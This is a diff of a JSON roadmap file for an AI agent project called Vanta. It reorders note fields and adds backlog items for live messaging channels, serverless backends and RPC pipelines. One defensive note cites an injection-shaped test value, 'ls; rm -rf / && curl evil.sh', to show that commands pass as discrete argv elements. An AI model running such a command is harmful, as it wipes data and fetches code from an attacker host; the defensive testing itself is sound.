+      "notes": "Pure/injectable MemantoMemory{id,text,score?} + MemantoMode rest|mcp + buildMemantoAddBody({text}) + buildMemantoSearchBody({query}) + parseMemantoMemories (tolerant array | {memories} | {results}; text|memory|content alias text-wins; numeric-id coercion; finite-score-only; control-stripped tab/newline preserved; [] on garbage) + resolveMemantoMode (VANTA_MEMANTO_MODE=mcp -> mcp else rest = local-first default) + memantoEnabled (VANTA_MEMANTO_URL set OR mode=mcp + VANTA_MEMANTO_MCP_SERVER; LOCAL-FIRST no key check) + makeMemantoAdapter({call:(op,payload)}) -> {add,search} routes via the single injected op-based call seam abstracting REST vs MCP; a throw -> {ok:false}/[] never throws. LOCAL-FIRST: no cloud key by design (a localhost URL / MCP server name) — NO key-shaped literal (gitleaks-safe). External text control-stripped. Both access modes over the established drive-sync MemoryAdapter port (mirrors mem0). Built+tested; wire = provider resolveMemoryProvider guarded by memantoEnabled reads resolveMemantoMode -> builds deps.call as localhost REST fetch (no auth header) OR routed mounted-MCP tool call -> routes recall through makeMemantoAdapter (named, live REST/MCP = boundary).",
       "after": [
         "MEMORY-PROVIDER-FRAMEWORK"
-      ],
-      "notes": "Pure/injectable MemantoMemory{id,text,score?} + MemantoMode rest|mcp + buildMemantoAddBody({text}) + buildMemantoSearchBody({query}) + parseMemantoMemories (tolerant array | {memories} | {results}; text|memory|content alias text-wins; numeric-id coercion; finite-score-only; control-stripped tab/newline preserved; [] on garbage) + resolveMemantoMode (VANTA_MEMANTO_MODE=mcp -> mcp else rest = local-first default) + memantoEnabled (VANTA_MEMANTO_URL set OR mode=mcp + VANTA_MEMANTO_MCP_SERVER; LOCAL-FIRST no key check) + makeMemantoAdapter({call:(op,payload)}) -> {add,search} routes via the single injected op-based call seam abstracting REST vs MCP; a throw -> {ok:false}/[] never throws. LOCAL-FIRST: no cloud key by design (a localhost URL / MCP server name) — NO key-shaped literal (gitleaks-safe). External text control-stripped. Both access modes over the established drive-sync MemoryAdapter port (mirrors mem0). Built+tested; wire = provider resolveMemoryProvider guarded by memantoEnabled reads resolveMemantoMode -> builds deps.call as localhost REST fetch (no auth header) OR routed mounted-MCP tool call -> routes recall through makeMemantoAdapter (named, live REST/MCP = boundary)."
+      ]
     },
     {
       "id": "BRAIN-MEMORY-CATEGORIES",
@@ -13041,10 +13041,10 @@
       "effort": "medium",
       "lens": "memory",
       "updated": "2026-06-21",
+      "notes": "Pure/injectable MemoryEntryRef{id,text} (mirrors world/conflicts CitedMatch provenance) + buildAnswerPrompt (question + numbered control-stripped entries + grounding rules: answer ONLY from these, cite the numbers, exact no memory on that fallback) + parseAnswer (extract ANSWER: body, read cited NUMBERS from CITES: line -> 1-based -> real entry id, DROP out-of-range hallucinated, dedupe, control-strip; requires the explicit CITES: marker not digit-scavenging so no false-cite) + answerFromMemory (injected recall+complete; no entries -> {ok:false,no-memory} with NO complete call asserted; else prompt->complete->parse; throw -> no-memory never throws; model no-memory reply -> no-answer) + providerComplete adapter. GROUNDED-ONLY: answer only when memory recalled AND model cited it; no memory = honest no-answer, NEVER fabricate. SECURITY: recalled text untrusted -> control-stripped in prompt+answer+citation ids. Built+tested; wire = brain.ts answer(question,env) facade -> answerFromMemory with real recall (BrainEntry->MemoryEntryRef) + CHEAP provider (aux-task) + brain tool answer action describeForSafety constant -> Allow (named).",
       "after": [
         "BRAIN-ROUTER"
-      ],
-      "notes": "Pure/injectable MemoryEntryRef{id,text} (mirrors world/conflicts CitedMatch provenance) + buildAnswerPrompt (question + numbered control-stripped entries + grounding rules: answer ONLY from these, cite the numbers, exact no memory on that fallback) + parseAnswer (extract ANSWER: body, read cited NUMBERS from CITES: line -> 1-based -> real entry id, DROP out-of-range hallucinated, dedupe, control-strip; requires the explicit CITES: marker not digit-scavenging so no false-cite) + answerFromMemory (injected recall+complete; no entries -> {ok:false,no-memory} with NO complete call asserted; else prompt->complete->parse; throw -> no-memory never throws; model no-memory reply -> no-answer) + providerComplete adapter. GROUNDED-ONLY: answer only when memory recalled AND model cited it; no memory = honest no-answer, NEVER fabricate. SECURITY: recalled text untrusted -> control-stripped in prompt+answer+citation ids. Built+tested; wire = brain.ts answer(question,env) facade -> answerFromMemory with real recall (BrainEntry->MemoryEntryRef) + CHEAP provider (aux-task) + brain tool answer action describeForSafety constant -> Allow (named)."
+      ]
     },
     {
       "id": "BRAIN-EVAL-LONGMEMEVAL",
@@ -13360,12 +13360,12 @@
       "tier": "pebble",
       "effort": "high",
       "lens": "reach",
+      "updated": "2026-06-21",
+      "notes": "Pure ServerlessProvider modal|daytona + zod ServerlessConfigSchema{provider,app?,image?,idleTimeoutSec?(int>0),network?} + resolveServerlessConfig (VANTA_SERVERLESS_PROVIDER + APP/IMAGE/IDLE_SEC/NET; no provider -> {ok:false,reason}) + buildServerlessArgs (DISCRETE argv: modal run [app] --timeout N [--image I] -- baseCmd / daytona exec [app] [--image I] --idle N [--no-network] -- baseCmd) + serverlessBackendEnabled (VANTA_EXEC_BACKEND=serverless AND a provider) + hibernatePolicy ({idleTimeoutSec, hibernates}; default 300s, non-positive disables) + SERVERLESS_CLI. SECURITY: argv ALWAYS an array never shell-interpolated — an injection-shaped baseCmd token (ls; rm -rf / && curl evil.sh) survives as ONE discrete element (asserted); kernel assess() runs UPSTREAM of wrapExec — a serverless backend changes WHERE a command runs NEVER WHETHER its allowed (mirrors BACKEND-DOCKER). NO Modal/Daytona SDK dep; live modal/daytona CLI = boundary; no cloud secret literal (gitleaks-safe). Built+tested; wire = exec/backend wrapExec adds a serverless case (serverlessBackendEnabled -> resolveServerlessConfig -> serverlessCliAvailable -> buildServerlessArgs; CLI absent/refused -> clean fallback to maybeSandbox/local) (named). Not configured = local/docker fallback.",
       "after": [
         "BACKEND-DOCKER",
         "VANTA-SSH-SESSION"
-      ],
-      "updated": "2026-06-21",
-      "notes": "Pure ServerlessProvider modal|daytona + zod ServerlessConfigSchema{provider,app?,image?,idleTimeoutSec?(int>0),network?} + resolveServerlessConfig (VANTA_SERVERLESS_PROVIDER + APP/IMAGE/IDLE_SEC/NET; no provider -> {ok:false,reason}) + buildServerlessArgs (DISCRETE argv: modal run [app] --timeout N [--image I] -- baseCmd / daytona exec [app] [--image I] --idle N [--no-network] -- baseCmd) + serverlessBackendEnabled (VANTA_EXEC_BACKEND=serverless AND a provider) + hibernatePolicy ({idleTimeoutSec, hibernates}; default 300s, non-positive disables) + SERVERLESS_CLI. SECURITY: argv ALWAYS an array never shell-interpolated — an injection-shaped baseCmd token (ls; rm -rf / && curl evil.sh) survives as ONE discrete element (asserted); kernel assess() runs UPSTREAM of wrapExec — a serverless backend changes WHERE a command runs NEVER WHETHER its allowed (mirrors BACKEND-DOCKER). NO Modal/Daytona SDK dep; live modal/daytona CLI = boundary; no cloud secret literal (gitleaks-safe). Built+tested; wire = exec/backend wrapExec adds a serverless case (serverlessBackendEnabled -> resolveServerlessConfig -> serverlessCliAvailable -> buildServerlessArgs; CLI absent/refused -> clean fallback to maybeSandbox/local) (named). Not configured = local/docker fallback."
+      ]
     },
     {
       "id": "SCRIPT-RPC-PIPELINE",
@@ -13947,8 +13947,8 @@
       "codex": "gpt-5.4-mini",
       "lens": "reach",
       "updated": "2026-06-21",
-      "source": "ref-audit-2026-06-20",
-      "notes": "Pure immutable TypingState{active,pausedForApproval,lastSentMs} + startTyping(nowMs) (active, stamps lastSentMs=now so the caller sends the opening tick) + stopTyping (inactive + pause cleared, idempotent) + pauseTypingForApproval/resumeTypingAfterApproval (toggle, active+lastSentMs preserved) + nextTypingTick(state,nowMs,intervalMs=5000) -> {state,shouldSend} (send ONLY when active AND !paused AND nowMs-lastSentMs>=interval; on send lastSentMs:=nowMs; else unchanged nothing sent) + typingHeartbeatEnabled (VANTA_TYPING_INDICATOR default ON, =0 disables). KEY BEHAVIOR (tested): a tick while pausedForApproval sends NOTHING even far past the interval — no typing while Vanta is blocked waiting on a human; resume returns ticks. Interval 5000ms under Telegram ~6s typing expiry. Built+tested; wire = pollPlatform startTyping when composing -> timer nextTypingTick -> a NEW optional PlatformAdapter.sendTyping (Telegram sendChatAction typing) when shouldSend -> wrap requestApproval with pause/resume -> stopTyping on reply sent (named, sendTyping = boundary). Not active = nothing."
+      "notes": "Pure immutable TypingState{active,pausedForApproval,lastSentMs} + startTyping(nowMs) (active, stamps lastSentMs=now so the caller sends the opening tick) + stopTyping (inactive + pause cleared, idempotent) + pauseTypingForApproval/resumeTypingAfterApproval (toggle, active+lastSentMs preserved) + nextTypingTick(state,nowMs,intervalMs=5000) -> {state,shouldSend} (send ONLY when active AND !paused AND nowMs-lastSentMs>=interval; on send lastSentMs:=nowMs; else unchanged nothing sent) + typingHeartbeatEnabled (VANTA_TYPING_INDICATOR default ON, =0 disables). KEY BEHAVIOR (tested): a tick while pausedForApproval sends NOTHING even far past the interval — no typing while Vanta is blocked waiting on a human; resume returns ticks. Interval 5000ms under Telegram ~6s typing expiry. Built+tested; wire = pollPlatform startTyping when composing -> timer nextTypingTick -> a NEW optional PlatformAdapter.sendTyping (Telegram sendChatAction typing) when shouldSend -> wrap requestApproval with pause/resume -> stopTyping on reply sent (named, sendTyping = boundary). Not active = nothing.",
+      "source": "ref-audit-2026-06-20"
     },
     {
       "id": "MSG-NO-REPLY-TOKEN",
@@ -14460,8 +14460,8 @@
       "codex": "gpt-5.4-mini",
       "lens": "infra",
       "updated": "2026-06-21",
-      "source": "ref-audit-2026-06-20",
-      "notes": "Pure/injectable SslIssue (missing-ca-file|self-signed|expired|unknown-tls) + SslGuardResult ({ok:true}|{ok:false,issue,hint}, errors-as-values never throws) + classifyTlsError (SELF_SIGNED_CERT_IN_CHAIN/DEPTH_ZERO_SELF_SIGNED_CERT/UNABLE_TO_GET_ISSUER_CERT_LOCALLY -> self-signed; CERT_HAS_EXPIRED -> expired; else unknown-tls) + sslHint (per-issue actionable, CA-relevant ones name NODE_EXTRA_CA_CERTS, missing-ca echoes the path, corporate-proxy interception called out) + checkSslGuard (caCertsPath set + !fileExists -> missing-ca-file pre-probe; else probeTls -> classify cert error / ok / a probe throw -> unknown-tls never crash) + formatSslGuardLine (✓ TLS ok / ⚠ TLS: issue — hint). Injected probe/fs = boundary. ADVISORY only — doctor health signal, does NOT change security posture, live fetch path unchanged. Built+tested; wire = status gatherStatus checkSslGuard(caCertsPath=NODE_EXTRA_CA_CERTS, fileExists, probeTls=HTTPS HEAD) + formatStatus pushes the line (named). Healthy = ok."
+      "notes": "Pure/injectable SslIssue (missing-ca-file|self-signed|expired|unknown-tls) + SslGuardResult ({ok:true}|{ok:false,issue,hint}, errors-as-values never throws) + classifyTlsError (SELF_SIGNED_CERT_IN_CHAIN/DEPTH_ZERO_SELF_SIGNED_CERT/UNABLE_TO_GET_ISSUER_CERT_LOCALLY -> self-signed; CERT_HAS_EXPIRED -> expired; else unknown-tls) + sslHint (per-issue actionable, CA-relevant ones name NODE_EXTRA_CA_CERTS, missing-ca echoes the path, corporate-proxy interception called out) + checkSslGuard (caCertsPath set + !fileExists -> missing-ca-file pre-probe; else probeTls -> classify cert error / ok / a probe throw -> unknown-tls never crash) + formatSslGuardLine (✓ TLS ok / ⚠ TLS: issue — hint). Injected probe/fs = boundary. ADVISORY only — doctor health signal, does NOT change security posture, live fetch path unchanged. Built+tested; wire = status gatherStatus checkSslGuard(caCertsPath=NODE_EXTRA_CA_CERTS, fileExists, probeTls=HTTPS HEAD) + formatStatus pushes the line (named). Healthy = ok.",
+      "source": "ref-audit-2026-06-20"
     },
     {
       "id": "OP-INSTALL-FASTPATH",
@@ -14477,8 +14477,8 @@
       "codex": "gpt-5.4-mini",
       "lens": "infra",
       "updated": "2026-06-21",
-      "source": "ref-audit-2026-06-20",
-      "notes": "Pure/injectable ProvisionState{hasProvider,hasKey,storeReady} + detectProvisionState (hasProvider from VANTA_PROVIDER case-insensitive vs PROVIDER_CATALOG.providerById; hasKey from the entrys envVar set OR a keyless/local entry envVar:null = ollama/lmstudio/claude-code/codex/custom; storeReady from injected deps.storeExists; no fs/provider construction) + isFullyProvisioned (all three) + shouldSkipWizard (isFullyProvisioned UNLESS VANTA_FORCE_SETUP=1) + fastpathReason (skipping setup: provider+key+store ready / running setup: <missing comma-joined>). Local/subscription providers need no key. Partial/ambiguous (no provider/key/store, unknown provider) -> false -> run wizard (SAFE DEFAULT, current behavior). UX convenience ONLY — kernel still gates; a missing key surfaces as a clear provider-call failure later, not a safety hole. Built+tested; wire = startInteractive/ensureConfiguredOrSetup checks shouldSkipWizard(env,{storeExists}) before runFullSetup, skip when true (named)."
+      "notes": "Pure/injectable ProvisionState{hasProvider,hasKey,storeReady} + detectProvisionState (hasProvider from VANTA_PROVIDER case-insensitive vs PROVIDER_CATALOG.providerById; hasKey from the entrys envVar set OR a keyless/local entry envVar:null = ollama/lmstudio/claude-code/codex/custom; storeReady from injected deps.storeExists; no fs/provider construction) + isFullyProvisioned (all three) + shouldSkipWizard (isFullyProvisioned UNLESS VANTA_FORCE_SETUP=1) + fastpathReason (skipping setup: provider+key+store ready / running setup: <missing comma-joined>). Local/subscription providers need no key. Partial/ambiguous (no provider/key/store, unknown provider) -> false -> run wizard (SAFE DEFAULT, current behavior). UX convenience ONLY — kernel still gates; a missing key surfaces as a clear provider-call failure later, not a safety hole. Built+tested; wire = startInteractive/ensureConfiguredOrSetup checks shouldSkipWizard(env,{storeExists}) before runFullSetup, skip when true (named).",
+      "source": "ref-audit-2026-06-20"
     },
     {
       "id": "OP-SETUP-FIELD-VALIDATE",
@@ -14510,8 +14510,8 @@
       "codex": "gpt-5.4-mini",
       "lens": "tui",
       "updated": "2026-06-21",
-      "source": "ref-audit-2026-06-20",
-      "notes": "Pure STARTUP_TIPS (14 readonly tips, each <=80 chars 💡 Tip:) + pickStartupTip (deterministic STARTUP_TIPS[abs(seed)%len]; seed 0 -> first, large wraps, negative/non-finite clamped, never crash/empty — NO Math.random) + startupTipsEnabled (VANTA_TIPS, default ON, =0/false/off/no disables) + formatStartupTip (tip or ). ACCURACY: every tip cross-checked REAL — 11 cite a /command verified present in the imported SLASH_COMMANDS (/handoff /verify /skeptic /next /where /reach /skillify /recover /boundary /auto /deep-research), 3 cite documented env vars (VANTA_VERIFY/PROACTIVE/TUI); a test asserts each tip token + cross-checks every cited command/var against the real set. Deliberately EXCLUDED VANTA_GLIMMER (not in the documented env list — would be fabricated). Built+tested; wire = interactive renderBanner appends formatStartupTip(sessionSeed,env) as the last line when non-empty (seed = session counter / day-of-year so it rotates per session, stable within one; named). Disabled = no tip."
+      "notes": "Pure STARTUP_TIPS (14 readonly tips, each <=80 chars 💡 Tip:) + pickStartupTip (deterministic STARTUP_TIPS[abs(seed)%len]; seed 0 -> first, large wraps, negative/non-finite clamped, never crash/empty — NO Math.random) + startupTipsEnabled (VANTA_TIPS, default ON, =0/false/off/no disables) + formatStartupTip (tip or ). ACCURACY: every tip cross-checked REAL — 11 cite a /command verified present in the imported SLASH_COMMANDS (/handoff /verify /skeptic /next /where /reach /skillify /recover /boundary /auto /deep-research), 3 cite documented env vars (VANTA_VERIFY/PROACTIVE/TUI); a test asserts each tip token + cross-checks every cited command/var against the real set. Deliberately EXCLUDED VANTA_GLIMMER (not in the documented env list — would be fabricated). Built+tested; wire = interactive renderBanner appends formatStartupTip(sessionSeed,env) as the last line when non-empty (seed = session counter / day-of-year so it rotates per session, stable within one; named). Disabled = no tip.",
+      "source": "ref-audit-2026-06-20"
     },
     {
       "id": "OP-COMPACTION-VISIBLE",
@@ -14751,8 +14751,8 @@
       "codex": "gpt-5.4",
       "lens": "coding",
       "updated": "2026-06-20",
-      "source": "ref-audit-2026-06-20",
-      "notes": "Real ACP stdio JSON-RPC server (initialize/session new+load/prompt-streaming/cancel/set_mode+model; session/update chunks; kernel ask→request_permission, block refused upstream). v1 boundary: each prompt = a fresh conversation (per-session cross-turn persistence deferred); image/audio caps false. acp/server.ts HTTP shim kept importable. vanta acp serve."
+      "notes": "Real ACP stdio JSON-RPC server (initialize/session new+load/prompt-streaming/cancel/set_mode+model; session/update chunks; kernel ask→request_permission, block refused upstream). v1 boundary: each prompt = a fresh conversation (per-session cross-turn persistence deferred); image/audio caps false. acp/server.ts HTTP shim kept importable. vanta acp serve.",
+      "source": "ref-audit-2026-06-20"
     },
     {
       "id": "EXT-ACP-EDIT-DIFF",
@@ -14880,8 +14880,8 @@
       "codex": "gpt-5.4-mini",
       "lens": "selfhood",
       "updated": "2026-06-21",
-      "source": "ref-audit-2026-06-20",
-      "notes": "Pure 5-test substance slop diagnostic (verify/, alongside the existing repl/anti-slop.ts VOICE-drift axis): hedgeDensity (weasel words/100w) + fillerDensity (boilerplate phrases) + buzzwordDensity (synergy/leverage/holistic..) + lacksSpecifics (no numbers/proper-nouns/code-tokens -> sloppy) + restatesPrompt (answer-vs-prompt overlap without new tokens) -> runSlopDiagnostic (tests:SlopTest[] {id,label,failed,detail?} ids [hedge,filler,no-specifics,restates-prompt,buzzword]; slopScore weighted avg; isSlop = slopScore>0.34 OR >=3 fail) + formatSlopReport (slop N% — failed: ids / — clean). Substantive text -> low score isSlop false; slop -> high + failed ids; empty -> 1.0 all-failed. Thresholds heuristic, tuned to clear cases not over-fit. Built+tested; wire = the Cofounder work-product reviewer / anti-slop caller runs runSlopDiagnostic(text,prompt) + rejects/flags when isSlop (named)."
+      "notes": "Pure 5-test substance slop diagnostic (verify/, alongside the existing repl/anti-slop.ts VOICE-drift axis): hedgeDensity (weasel words/100w) + fillerDensity (boilerplate phrases) + buzzwordDensity (synergy/leverage/holistic..) + lacksSpecifics (no numbers/proper-nouns/code-tokens -> sloppy) + restatesPrompt (answer-vs-prompt overlap without new tokens) -> runSlopDiagnostic (tests:SlopTest[] {id,label,failed,detail?} ids [hedge,filler,no-specifics,restates-prompt,buzzword]; slopScore weighted avg; isSlop = slopScore>0.34 OR >=3 fail) + formatSlopReport (slop N% — failed: ids / — clean). Substantive text -> low score isSlop false; slop -> high + failed ids; empty -> 1.0 all-failed. Thresholds heuristic, tuned to clear cases not over-fit. Built+tested; wire = the Cofounder work-product reviewer / anti-slop caller runs runSlopDiagnostic(text,prompt) + rejects/flags when isSlop (named).",
+      "source": "ref-audit-2026-06-20"
     },
     {
       "id": "SOL-MIXTURE-OF-AGENTS",
@@ -15057,8 +15057,8 @@
       "codex": "gpt-5.4",
       "lens": "agent-loop",
       "updated": "2026-06-20",
-      "source": "cofounder-survey-2026-06-20",
-      "notes": "Pure OutcomeContract + canCloseTask gate wired into team/tasks advanceTask (running->done refused unless an artifact of the expected type exists OR a no-artifact reason is set; fail-closed by default; no-contract task unchanged). The hasArtifact predicate is injected; connecting it to the work-products store at the live `team advance` call site is ENFORCED-OUTCOME-WIRE."
+      "notes": "Pure OutcomeContract + canCloseTask gate wired into team/tasks advanceTask (running->done refused unless an artifact of the expected type exists OR a no-artifact reason is set; fail-closed by default; no-contract task unchanged). The hasArtifact predicate is injected; connecting it to the work-products store at the live `team advance` call site is ENFORCED-OUTCOME-WIRE.",
+      "source": "cofounder-survey-2026-06-20"
     },
     {
       "id": "COFOUNDER-WORK-PRODUCTS",
@@ -15122,8 +15122,8 @@
       "codex": "gpt-5.4",
       "lens": "agent-loop",
       "updated": "2026-06-20",
-      "source": "cofounder-survey-2026-06-20",
-      "notes": "Pure runCompanyTick orchestration (per-dept beat: dispatch one task when dept has open goals + remaining budget; one-per-dept; failures isolated) + tested. Live `vanta company tick` deps assembly (departments + kernel goals + budget + team-tasks dispatch) deferred to CADENCE-WIRE."
+      "notes": "Pure runCompanyTick orchestration (per-dept beat: dispatch one task when dept has open goals + remaining budget; one-per-dept; failures isolated) + tested. Live `vanta company tick` deps assembly (departments + kernel goals + budget + team-tasks dispatch) deferred to CADENCE-WIRE.",
+      "source": "cofounder-survey-2026-06-20"
     },
     {
       "id": "COFOUNDER-OKR-METRICS",
@@ -15171,8 +15171,8 @@
       "codex": "gpt-5.4",
       "lens": "infra",
       "updated": "2026-06-20",
-      "source": "cofounder-survey-2026-06-20",
-      "notes": "Pure grant/checkDelegated/audit shipped + `vanta authority` CLI live. checkDelegated auto-approves only an ASK-tier request within an active grant's bound (spend<=maxUsd or write in scope via resolveInScope); Block-floor NEVER delegated. Live kernel wire (call checkDelegated at the ask tier + append audit) deferred to DELEGATED-AUTHORITY-WIRE."
+      "notes": "Pure grant/checkDelegated/audit shipped + `vanta authority` CLI live. checkDelegated auto-approves only an ASK-tier request within an active grant's bound (spend<=maxUsd or write in scope via resolveInScope); Block-floor NEVER delegated. Live kernel wire (call checkDelegated at the ask tier + append audit) deferred to DELEGATED-AUTHORITY-WIRE.",
+      "source": "cofounder-survey-2026-06-20"
     },
     {
       "id": "COFOUNDER-COMPANY-TEMPLATE",
@@ -15236,8 +15236,8 @@
       "codex": "gpt-5.4-mini",
       "lens": "agent-loop",
       "updated": "2026-06-21",
-      "source": "cofounder-survey-2026-06-20",
-      "notes": "LIVE WIRE that also FIXED A LATENT BUG: the pure outcome gate (cofounder/outcome-contract canCloseTask) was already wired into advanceTask via checkOutcomeGate, BUT the live advance sites passed NO hasArtifact predicate -> the default ()=>false would WRONGLY REFUSE any contract-bearing task (never read the store). Fix: inject a work-products-store-backed probe at the 2 live advance-to-done sites (tools/team.ts doAdvance + tools/team-run.ts settle), resolved ONLY when targeting done. Two new helpers bridge gate<->store without changing either: cofounder/outcome-gate.ts (PURE taskProducedArtifact + artifactProbeForTask: a declared outcome satisfied iff the store holds an artifact with sourceTaskId===task.id) + tools/task-outcome-probe.ts (thin adapter resolveTaskArtifactProbe reuses readWorkProducts, read failure -> empty probe never throws). DEFAULT-PERMISSIVE (asserted): no outcome contract -> advances to done unchanged (gate skipped, predicate never consulted; no live path sets outcome today so byte-identical). REQUIRED+UNMET -> refused with reason (errors-as-value, task stays running, never throws). REQUIRED+MET -> allowed. store failure -> permissive. DONE-ONLY (non-done transitions unaffected). KERNEL STILL GATES every tool a tasks work invokes — this is a COMPLETION-EVIDENCE gate NOT a permission gate. fleet.ts sets done directly (not via advanceTask) so left untouched. I re-verified the FULL suite myself (10220 green, tsc clean). Non-kernel hot-path wire."
+      "notes": "LIVE WIRE that also FIXED A LATENT BUG: the pure outcome gate (cofounder/outcome-contract canCloseTask) was already wired into advanceTask via checkOutcomeGate, BUT the live advance sites passed NO hasArtifact predicate -> the default ()=>false would WRONGLY REFUSE any contract-bearing task (never read the store). Fix: inject a work-products-store-backed probe at the 2 live advance-to-done sites (tools/team.ts doAdvance + tools/team-run.ts settle), resolved ONLY when targeting done. Two new helpers bridge gate<->store without changing either: cofounder/outcome-gate.ts (PURE taskProducedArtifact + artifactProbeForTask: a declared outcome satisfied iff the store holds an artifact with sourceTaskId===task.id) + tools/task-outcome-probe.ts (thin adapter resolveTaskArtifactProbe reuses readWorkProducts, read failure -> empty probe never throws). DEFAULT-PERMISSIVE (asserted): no outcome contract -> advances to done unchanged (gate skipped, predicate never consulted; no live path sets outcome today so byte-identical). REQUIRED+UNMET -> refused with reason (errors-as-value, task stays running, never throws). REQUIRED+MET -> allowed. store failure -> permissive. DONE-ONLY (non-done transitions unaffected). KERNEL STILL GATES every tool a tasks work invokes — this is a COMPLETION-EVIDENCE gate NOT a permission gate. fleet.ts sets done directly (not via advanceTask) so left untouched. I re-verified the FULL suite myself (10220 green, tsc clean). Non-kernel hot-path wire.",
+      "source": "cofounder-survey-2026-06-20"
     },
     {
       "id": "CADENCE-WIRE",
@@ -15253,8 +15253,8 @@
       "codex": "gpt-5.4-mini",
       "lens": "agent-loop",
       "updated": "2026-06-21",
-      "source": "cofounder-survey-2026-06-20",
-      "notes": "LIVE WIRE: vanta company tick was a NO-OP (the command wasnt even in the cli.ts COMMANDS table + no live-deps builder existed). Now registered (company: runCompanyCommand) + wired with REAL deps via buildCompanyTickDeps(liveCompanySources(root)) into the UNCHANGED pure runCompanyTick: departments = cofounder/department readDepartments (DEPARTMENT-UNIT store ~/.vanta/departments.json); goals = kernel ledger getGoals + openGoalIdsFor (dept-owned still-active); budget = budget/store getBudget(dataDir, dept.budgetScope) -> remainingUsd (null=unbounded); dispatch = team/tasks nextAssignedTask (oldest assigned owned by a dept worker) -> advanceTask assigned->running. SAFE empty-deps fallback at 2 levels: listDepartments failure -> empty company -> clean no-op tick (never throws); each per-dept read .catch-degraded to a safe skip. New pure mappers in cofounder/cadence-deps.ts (injectable, unit-tested: dispatch/no-open-goals/no-budget/unbounded/no-task/dep-load-failure/per-read-failure). KERNEL STILL GATES: the dispatch seam only mutates the non-tool team task ledger; any tool a later worker run invokes still passes assess() unchanged (documented inline). No logic change to the pure tick. I re-verified the FULL suite myself (10205 green, tsc clean). Non-kernel hot-path wire."
+      "notes": "LIVE WIRE: vanta company tick was a NO-OP (the command wasnt even in the cli.ts COMMANDS table + no live-deps builder existed). Now registered (company: runCompanyCommand) + wired with REAL deps via buildCompanyTickDeps(liveCompanySources(root)) into the UNCHANGED pure runCompanyTick: departments = cofounder/department readDepartments (DEPARTMENT-UNIT store ~/.vanta/departments.json); goals = kernel ledger getGoals + openGoalIdsFor (dept-owned still-active); budget = budget/store getBudget(dataDir, dept.budgetScope) -> remainingUsd (null=unbounded); dispatch = team/tasks nextAssignedTask (oldest assigned owned by a dept worker) -> advanceTask assigned->running. SAFE empty-deps fallback at 2 levels: listDepartments failure -> empty company -> clean no-op tick (never throws); each per-dept read .catch-degraded to a safe skip. New pure mappers in cofounder/cadence-deps.ts (injectable, unit-tested: dispatch/no-open-goals/no-budget/unbounded/no-task/dep-load-failure/per-read-failure). KERNEL STILL GATES: the dispatch seam only mutates the non-tool team task ledger; any tool a later worker run invokes still passes assess() unchanged (documented inline). No logic change to the pure tick. I re-verified the FULL suite myself (10205 green, tsc clean). Non-kernel hot-path wire.",
+      "source": "cofounder-survey-2026-06-20"
     },
     {
       "id": "DELEGATED-AUTHORITY-WIRE",
@@ -15271,6 +15271,217 @@
       "lens": "infra",
       "updated": "2026-06-20",
       "source": "cofounder-survey-2026-06-20"
+    },
+    {
+      "id": "BETA-LIVE-PROOF",
+      "track": "Harness",
+      "title": "Open-beta gate — live-prove the top operator task paths on a clean machine",
+      "status": "next",
+      "size": "M",
+      "summary": "Many capabilities are unit-tested but live-gated. Pick the top N operator task paths (multi-step build task; reach-me-on-Telegram; run a scheduled job; desktop/voice action) and prove each end-to-end on a NON-dev machine with a real model + real creds. This is the open-beta readiness gate, sibling to INSTALL-PARITY.",
+      "done": "Each named task path runs end-to-end on a clean machine (not the dev box) with captured evidence; the list of live-proven vs still-gated paths is recorded in the repo.",
+      "tier": "rock",
+      "lens": "infra",
+      "source": "hermes-openclaw-audit-2026-06-21"
+    },
+    {
+      "id": "MSG-MULTICHANNEL-LIVE",
+      "track": "Operator",
+      "title": "Multi-channel LIVE — 5+ platforms from one gateway (Telegram · WhatsApp · Signal · Discord · Slack)",
+      "status": "next",
+      "size": "L",
+      "summary": "Adapters exist (many marked shipped) but only Telegram is proven live. Bring 5+ channels actually live end-to-end from the single gateway — Telegram (live) + WhatsApp + Signal + Discord + Slack — with real tokens, inbound→agent→reply proven, matching Hermes' 'lives where you do'.",
+      "done": "From one running gateway, a message on each of Telegram, WhatsApp, Signal, Discord, and Slack reaches the agent and gets a reply, verified live; the gateway survives one channel failing.",
+      "tier": "rock",
+      "lens": "reach",
+      "source": "hermes-openclaw-audit-2026-06-21",
+      "after": [
+        "MSG-ADAPTER-WHATSAPP",
+        "MSG-ADAPTER-SLACK"
+      ]
+    },
+    {
+      "id": "MSG-MEDIA-IMAGES",
+      "track": "Operator",
+      "title": "Images + voice memos in/out across channels",
+      "status": "next",
+      "size": "M",
+      "summary": "Multimodal messaging: receive an image or voice memo on a channel → into the agent's context (vision/STT); send images back (screenshots, generated images, charts). Vanta already carries images on the internal Message type and has vision + STT — wire them through the channel adapters so 'send Vanta a photo on WhatsApp/Telegram' and 'Vanta replies with an image' work.",
+      "done": "On at least Telegram + WhatsApp, an inbound image is understood by the agent and an outbound image is delivered; an inbound voice memo is transcribed; all verified live.",
+      "tier": "rock",
+      "lens": "reach",
+      "source": "hermes-openclaw-audit-2026-06-21",
+      "after": [
+        "MSG-MULTICHANNEL-LIVE"
+      ]
+    },
+    {
+      "id": "BACKEND-SERVERLESS-LIVE",
+      "track": "Harness",
+      "title": "Serverless LIVE — Modal/Daytona hibernate + wake-on-message, proven",
+      "status": "next",
+      "size": "L",
+      "summary": "BACKEND-SERVERLESS shipped as a pure slice (argv-not-shell). Prove it live: the agent runs on Modal/Daytona, hibernates when idle (~$0), and wakes on an inbound message so you can 'talk to it from Telegram while it works on a cloud VM' — the Hermes run-anywhere story. The kernel travels with it and gates remotely.",
+      "done": "A real Modal (or Daytona) deployment runs the gateway, hibernates when idle, wakes on an inbound message, processes it, and replies end-to-end — with cost-when-idle near zero, verified.",
+      "tier": "rock",
+      "lens": "infra",
+      "source": "hermes-openclaw-audit-2026-06-21",
+      "after": [
+        "BACKEND-SERVERLESS"
+      ]
+    },
+    {
+      "id": "RPC-PIPELINE-VERIFY",
+      "track": "Harness",
+      "title": "Verify + harden SCRIPT-RPC-PIPELINE as first-class zero-context pipelines",
+      "status": "next",
+      "size": "M",
+      "summary": "SCRIPT-RPC-PIPELINE is marked shipped. Confirm it is actually wired and first-class: the agent writes a script that calls tools over RPC and collapses a multi-step pipeline into ONE turn with no per-step model round-trip (Hermes' headline efficiency trick). Measure context/turn savings on a real pipeline; harden + document if there are gaps.",
+      "done": "A representative multi-step task (fetch→transform→write across several tools) runs as a single scripted RPC pipeline in one turn, with measured context savings vs the per-tool-call path and a documented worked example.",
+      "tier": "rock",
+      "lens": "agent-loop",
+      "source": "hermes-openclaw-audit-2026-06-21",
+      "after": [
+        "SCRIPT-RPC-PIPELINE"
+      ]
+    },
